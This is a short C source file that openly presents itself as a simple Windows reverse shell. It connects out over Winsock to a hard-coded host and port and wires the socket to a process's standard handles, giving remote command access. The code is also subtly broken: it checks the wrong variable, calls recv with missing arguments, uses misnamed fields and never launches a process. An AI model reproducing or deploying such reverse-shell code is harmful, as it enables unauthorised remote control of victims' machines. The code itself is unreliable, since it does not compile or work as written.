/*
    Author:    lemur
    GitHub:    https://github.com/1emvr
    Email:     1emvr@protonmail.com
    Date:      01/02/2023  05:15 AM

    Simple WinAPI Reverse Shell.
*/
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

int main() {

    // Defining Datatypes for Handlers
    SOCKET reverse_shell;
    WSADATA ws_api;
    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_info;

    // Connection Related Definitions
    char RecvServer[512];
    char host_addr[] = "10.51.51.190"; 
    int port = 8081;

    // Internet Socket Address Struct
    struct sockaddr_in shell_addr;

    // Winsock API
    WSAStartup(MAKEWORD(2,2), &ws_api);
    reverse_shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    // Sockaddr Definitions
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(host_addr);

    // Initiate Connection to Remote Host
    int connection = WSAConnect(reverse_shell, (SOCKADDR *) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    
    // Error Handling
    if(connect == SOCKET_ERROR) {
        printf("Connection to target server failed\n"); exit(0);
    } else {
        // Else, Receive Line/ Startup Window
        recv(reverse_shell, RecvServer);

        startup_info.cb = sizeof(startup_info);
        startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        startup_info.hStdInput = startup_info.StdOutput = startup_info.StdError = (HANDLE) reverse_shell;
    }
}